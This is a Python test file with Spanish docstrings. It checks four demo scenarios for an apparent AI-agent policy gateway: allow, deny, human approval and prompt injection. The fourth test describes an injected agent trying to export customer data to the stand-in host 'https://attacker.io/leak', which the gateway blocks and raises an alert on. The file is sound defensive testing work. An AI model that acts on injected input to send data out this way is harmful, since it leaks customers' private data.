"""Certificación de los 4 Escenarios Clave de la Demo Oficial de AgentGuard.

Valida el comportamiento integral de la API REST del Gateway (PEP) y el Motor de Políticas (PDP)
según la especificación formal del tribunal (agentguard_secuencia_demo.md):
- Escenario 1: Operación Normal (ALLOW -> 200 OK + EXECUTED)
- Escenario 2: Abuso de Privilegio (DENY -> 403 Forbidden + REJECTED sin tocar backend destino)
- Escenario 3: Operación de Alto Impacto con Aprobación Humana (REQUIRE_APPROVAL -> 202 Accepted + RESOLVE APPROVED)
- Escenario 4: Prompt Injection y Alerta Crítica (DENY + ALERT -> 403 Forbidden + Alerta CRITICAL)
"""

import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch
import pytest
from httpx import ASGITransport, AsyncClient

from app.core.database import get_db
from app.main import app
from app.models.agent import Agent, AgentTool
from app.models.alert import Alert
from app.models.approval import Approval
from app.models.enums import (
    AgentStatus,
    AlertSeverity,
    AlertStatus,
    ApprovalStatus,
    ExecutionStatus,
    PolicyDecision,
    RiskLevel,
)
from app.models.execution import Execution
from app.models.tool import Tool, ToolAction
from app.services.pdp_engine import PDPDecisionResult


@pytest.mark.asyncio
async def test_demo_scenario_1_normal_operation_allow():
    """ESCENARIO 1: Operación Normal (ALLOW).

    El agente de ventas solicita `create_quote` por $2,500.
    El PDP evalúa la regla (monto < $10,000) -> emite ALLOW.
    El Gateway despacha a la API externa y retorna 200 OK + EXECUTED.
    """
    org_id = uuid.uuid4()
    agent_id = uuid.uuid4()
    tool_id = uuid.uuid4()
    action_id = uuid.uuid4()

    agent = Agent(id=agent_id, organization_id=org_id, status=AgentStatus.ACTIVE, name="Sales Agent")
    tool = Tool(id=tool_id, organization_id=org_id, name="CRM Facturación", endpoint_url="https://crm.api.corp")
    action = ToolAction(id=action_id, tool_id=tool_id, action_name="create_quote", risk_level=RiskLevel.LOW)
    agent_tool = AgentTool(agent_id=agent_id, tool_id=tool_id, enabled=True)

    mock_db = AsyncMock()
    mock_db.add = MagicMock()

    res_agent = MagicMock()
    res_agent.scalar_one_or_none.return_value = agent
    res_tool = MagicMock()
    res_tool.scalar_one_or_none.return_value = tool
    res_action = MagicMock()
    res_action.scalar_one_or_none.return_value = action
    res_agent_tool = MagicMock()
    res_agent_tool.scalar_one_or_none.return_value = agent_tool

    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]

    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        with patch("app.services.pep_gateway_service.pdp_engine.evaluate") as mock_pdp:
            mock_pdp.return_value = PDPDecisionResult(
                decision=PolicyDecision.ALLOW,
                evaluated_policy_rule_id=uuid.uuid4(),
                reason="Monto de cotización $2,500 inferior al límite de $10,000",
            )

            transport = ASGITransport(app=app)
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                payload = {
                    "organization_id": str(org_id),
                    "agent_id": str(agent_id),
                    "tool_id": str(tool_id),
                    "action_name": "create_quote",
                    "parameters": {"amount": 2500, "customer": "Acme Corp"},
                }
                res = await client.post("/api/v1/gateway/execute", json=payload)

                assert res.status_code == 200
                data = res.json()
                assert data["decision"] == "ALLOW"
                assert data["status"] == "EXECUTED"
                assert data["result"] is not None
                assert data["result"]["status"] == "success"
                assert data["approval_id"] is None
                assert mock_db.commit.await_count >= 1
    finally:
        app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_demo_scenario_2_privilege_abuse_deny():
    """ESCENARIO 2: Abuso de Privilegio (DENY).

    El agente de ventas intenta invocar `update_price`.
    El agente NO tiene autorizada dicha herramienta en `AgentTool`.
    El Gateway bloquea en seco: la API destino NUNCA recibe la llamada.
    Retorna 403 Forbidden + REJECTED + 'Agent lacks capability'.
    """
    org_id = uuid.uuid4()
    agent_id = uuid.uuid4()
    tool_id = uuid.uuid4()
    action_id = uuid.uuid4()

    agent = Agent(id=agent_id, organization_id=org_id, status=AgentStatus.ACTIVE, name="Sales Agent")
    tool = Tool(id=tool_id, organization_id=org_id, name="Catálogo de Precios", endpoint_url="https://pricing.api.corp")
    action = ToolAction(id=action_id, tool_id=tool_id, action_name="update_price", risk_level=RiskLevel.HIGH)

    mock_db = AsyncMock()
    mock_db.add = MagicMock()

    res_agent = MagicMock()
    res_agent.scalar_one_or_none.return_value = agent
    res_tool = MagicMock()
    res_tool.scalar_one_or_none.return_value = tool
    res_action = MagicMock()
    res_action.scalar_one_or_none.return_value = action
    res_agent_tool = MagicMock()
    res_agent_tool.scalar_one_or_none.return_value = None  # Capacidad no asignada

    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]

    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            payload = {
                "organization_id": str(org_id),
                "agent_id": str(agent_id),
                "tool_id": str(tool_id),
                "action_name": "update_price",
                "parameters": {"product_id": 88, "new_price": 10},
            }
            res = await client.post("/api/v1/gateway/execute", json=payload)

            assert res.status_code == 403
            data = res.json()
            assert data["decision"] == "DENY"
            assert data["status"] == "REJECTED"
            assert "Agent lacks capability" in data["error_message"]
            assert data["result"] is None
            assert mock_db.commit.await_count >= 1
    finally:
        app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_demo_scenario_3_high_impact_require_approval_and_resolve():
    """ESCENARIO 3: Operación de Alto Impacto con Aprobación Humana (REQUIRE_APPROVAL).

    Paso 3.1: El agente invoca `refund` por $4,500.
    La política exige que devoluciones >= $500 requieren autorización humana.
    El Gateway suspende la ejecución: 202 Accepted + PENDING_APPROVAL + ticket de aprobación.

    Paso 3.2: Un operador humano consulta la bandeja y resuelve el ticket en `/resolve`.
    El ticket pasa a APPROVED y la ejecución pasa a EXECUTED.
    """
    org_id = uuid.uuid4()
    agent_id = uuid.uuid4()
    tool_id = uuid.uuid4()
    action_id = uuid.uuid4()

    agent = Agent(id=agent_id, organization_id=org_id, status=AgentStatus.ACTIVE, name="Sales Agent")
    tool = Tool(id=tool_id, organization_id=org_id, name="Stripe API", endpoint_url="https://stripe.api.corp")
    action = ToolAction(id=action_id, tool_id=tool_id, action_name="refund", risk_level=RiskLevel.HIGH)
    agent_tool = AgentTool(agent_id=agent_id, tool_id=tool_id, enabled=True)

    mock_db = AsyncMock()
    mock_db.add = MagicMock()

    res_agent = MagicMock()
    res_agent.scalar_one_or_none.return_value = agent
    res_tool = MagicMock()
    res_tool.scalar_one_or_none.return_value = tool
    res_action = MagicMock()
    res_action.scalar_one_or_none.return_value = action
    res_agent_tool = MagicMock()
    res_agent_tool.scalar_one_or_none.return_value = agent_tool

    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]

    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        # Paso 3.1: Intercepción y suspensión
        with patch("app.services.pep_gateway_service.pdp_engine.evaluate") as mock_pdp:
            mock_pdp.return_value = PDPDecisionResult(
                decision=PolicyDecision.REQUIRE_APPROVAL,
                evaluated_policy_rule_id=uuid.uuid4(),
                reason="Reembolso de $4,500 excede el umbral automático de $500",
            )

            transport = ASGITransport(app=app)
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                payload = {
                    "organization_id": str(org_id),
                    "agent_id": str(agent_id),
                    "tool_id": str(tool_id),
                    "action_name": "refund",
                    "parameters": {"amount": 4500, "customer_id": 302},
                }
                res = await client.post("/api/v1/gateway/execute", json=payload)

                assert res.status_code == 202
                data = res.json()
                assert data["decision"] == "REQUIRE_APPROVAL"
                assert data["status"] == "PENDING_APPROVAL"
                approval_id = data["approval_id"]
                assert approval_id is not None

        # Paso 3.2: Resolución humana
        approver_id = uuid.uuid4()
        now = datetime.now(timezone.utc)
        resolved_approval = Approval(
            id=uuid.UUID(approval_id),
            execution_id=uuid.UUID(data["execution_id"]),
            assigned_approver_id=approver_id,
            status=ApprovalStatus.APPROVED,
            resolution_reason="Cliente VIP validado",
            resolved_at=now,
            created_at=now,
        )

        with patch("app.api.approvals.pep_gateway_service.resolve_approval", new_callable=AsyncMock) as mock_resolve:
            mock_resolve.return_value = resolved_approval

            async with AsyncClient(transport=transport, base_url="http://test") as client:
                resolve_payload = {
                    "decision": "APPROVED",
                    "resolution_reason": "Cliente VIP validado",
                    "approver_user_id": str(approver_id),
                }
                res_resolve = await client.post(f"/api/v1/approvals/{approval_id}/resolve", json=resolve_payload)

                assert res_resolve.status_code == 200
                res_data = res_resolve.json()
                assert res_data["id"] == approval_id
                assert res_data["status"] == "APPROVED"
                assert res_data["resolution_reason"] == "Cliente VIP validado"
    finally:
        app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_demo_scenario_4_prompt_injection_deny_and_critical_alert():
    """ESCENARIO 4: Prompt Injection y Alerta Crítica (DENY + ALERT).

    El agente procesa un input malicioso e intenta exfiltrar datos invocando
    `export_customers(destination: 'https://attacker.io/leak')`.
    La acción tiene `risk_level: CRITICAL`.
    El PDP emite DENY.
    El Gateway responde 403 Forbidden y persiste una Alerta Crítica (CRITICAL) en BD.
    """
    org_id = uuid.uuid4()
    agent_id = uuid.uuid4()
    tool_id = uuid.uuid4()
    action_id = uuid.uuid4()

    agent = Agent(id=agent_id, organization_id=org_id, status=AgentStatus.ACTIVE, name="Sales Agent")
    tool = Tool(id=tool_id, organization_id=org_id, name="CRM Database", endpoint_url="https://crm.api.corp")
    action = ToolAction(id=action_id, tool_id=tool_id, action_name="export_customers", risk_level=RiskLevel.CRITICAL)
    agent_tool = AgentTool(agent_id=agent_id, tool_id=tool_id, enabled=True)

    mock_db = AsyncMock()
    persisted_entities = []

    def capture_add(entity):
        persisted_entities.append(entity)

    mock_db.add = MagicMock(side_effect=capture_add)

    res_agent = MagicMock()
    res_agent.scalar_one_or_none.return_value = agent
    res_tool = MagicMock()
    res_tool.scalar_one_or_none.return_value = tool
    res_action = MagicMock()
    res_action.scalar_one_or_none.return_value = action
    res_agent_tool = MagicMock()
    res_agent_tool.scalar_one_or_none.return_value = agent_tool

    mock_db.execute.side_effect = [res_agent, res_tool, res_action, res_agent_tool]

    app.dependency_overrides[get_db] = lambda: mock_db

    try:
        with patch("app.services.pep_gateway_service.pdp_engine.evaluate") as mock_pdp:
            mock_pdp.return_value = PDPDecisionResult(
                decision=PolicyDecision.DENY,
                evaluated_policy_rule_id=uuid.uuid4(),
                reason="Destino no homologado https://attacker.io/leak (política anti-exfiltración)",
            )

            transport = ASGITransport(app=app)
            async with AsyncClient(transport=transport, base_url="http://test") as client:
                payload = {
                    "organization_id": str(org_id),
                    "agent_id": str(agent_id),
                    "tool_id": str(tool_id),
                    "action_name": "export_customers",
                    "parameters": {"destination": "https://attacker.io/leak"},
                }
                res = await client.post("/api/v1/gateway/execute", json=payload)

                assert res.status_code == 403
                data = res.json()
                assert data["decision"] == "DENY"
                assert data["status"] == "REJECTED"
                assert "anti-exfiltración" in data["error_message"]

                # Verificar que se generó y persistió la Alerta de Seguridad Crítica
                alerts = [e for e in persisted_entities if isinstance(e, Alert)]
                assert len(alerts) == 1
                created_alert = alerts[0]
                assert created_alert.severity == AlertSeverity.CRITICAL
                assert created_alert.status == AlertStatus.OPEN
                assert "export_customers" in created_alert.title
                assert created_alert.organization_id == org_id
    finally:
        app.dependency_overrides.clear()
